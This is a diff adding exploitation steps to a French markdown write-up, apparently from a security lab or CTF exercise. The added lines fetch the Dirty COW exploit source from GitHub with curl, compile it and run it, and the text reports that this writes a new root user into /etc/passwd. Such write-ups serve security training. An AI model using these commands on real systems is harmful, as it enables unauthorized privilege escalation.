@@ -8,6 +8,13 @@ $> uname -r
 3.2.0-91-generic-pae
 ```
 - L'exploit est donc compatible avec notre version de linux
+- On lance donc l'exploit
+```
+curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+```
+- L'exploit arrive donc a ecrire un nouvelle utilisateur root dans /etc/passwd 
 
 ## Source
 - [Explication](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html#what-is-cow)
